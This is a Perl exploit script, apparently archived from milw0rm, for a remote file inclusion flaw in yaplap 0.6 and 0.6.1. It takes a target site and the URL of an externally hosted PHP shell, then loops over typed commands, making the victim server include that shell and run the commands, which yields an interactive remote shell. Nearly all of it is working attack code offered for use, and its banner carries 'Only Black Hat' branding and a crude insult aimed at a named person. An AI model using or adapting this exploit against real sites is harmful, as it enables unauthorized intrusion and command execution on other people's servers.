#!/usr/bin/perl
#yaplap Remote File Inclusion Vulnerablity
#Version 0.6 & 0.6.1
#Class = Remote File Inclusion
#Bug Found & Exploit [c]oded By  DeltahackingTEAM      (Dr.Trojan&Dr.Pantagon)
#Download:http://osdn.dl.sourceforge.net/sourceforge/yaplap/yaplap-0.6.1.tar.gz
#Vulnerable Code:include $LOGIN_style."_form.php";
#[Path]/Index.php?site_main_path=
#Exploit: ldap.php?LOGIN_style=[shell]
# FUCK Your Mother &Your SisTer=>>> z_zer0c00l
use LWP::UserAgent;

$target=@ARGV[0];
$shellsite=@ARGV[1];
$cmdv=@ARGV[2];

if($target!~/http:\/\// || $shellsite!~/http:\/\// || !$cmdv)
{
       usg()
}
header();


while()
{
print "[Shell] \$";
while (<STDIN>)
{
       $cmd=$_;
       chomp($cmd);

$xpl = LWP::UserAgent->new() or die;
$req = HTTP::Request->new(GET=>$target.'ldap.php?LOGIN_style='.$shellsite='.?&'.$cmdv.'='.$cmd)or die "\n\n Failed to Connect, Try again!\n";
$res = $xpl->request($req);
$info = $res->content;
$info =~ tr/[\n]/[&#234;]/;


if (!$cmd) {
print "\nEnter a Command\n\n"; $info ="";
}


elsif ($info =~/failed to open stream: HTTP request failed!/ || $info =~/:
Cannot execute a blank command in <b>/)
{
print "\nCould Not Connect to cmd Host or Invalid Command Variable\n";
exit;
}


elsif ($info =~/^<br.\/>.<b>Warning/) {
print "\nInvalid Command\n\n";
};


if($info =~ /(.+)<br.\/>.<b>Warning.(.+)<br.\/>.<b>Warning/)
{
$final = $1;
$final=~ tr/[&#234;]/[\n]/;
print "\n$final\n";
last;
}

else {
print "[shell] \$";
}
}
}
last;



sub header()
{
print q{
*******************************************************************************
         ***(#$#$#$#$#$=>http://www.deltasecurity.ir<=#$#$#$#$#$)***

Vulnerablity found By: DeltahackingTEAM

Exploit [c]oded By: Dr.Trojan

Dr.Trojan,HIV++,D_7j,Lord,VPc,Tanha,Dr.Pantagon

http://advistory.deltasecurity.ir

We Server(99/999% Secure) <<<<<www.takserver.ir>>>>>

Email:Dr.Trojan[A]deltasecurity.ir 0nly Black Hat
******************************************************************************
}
}
sub usg()
{
header();
print q{
Usage: perl delta.pl [tucows fullpath] [Shell Location] [Shell Cmd]
[yaplap FULL PATH] - Path to site exp. www.site.com
[shell Location] - Path to shell exp. d4wood.by.ru/cmd.gif
[shell Cmd Variable] - Command variable for php shell
Example: perl delta.pl http://www.site.com/[yaplap]/
********************************************************************************
};

exit();
}

# milw0rm.com [2006-12-14]
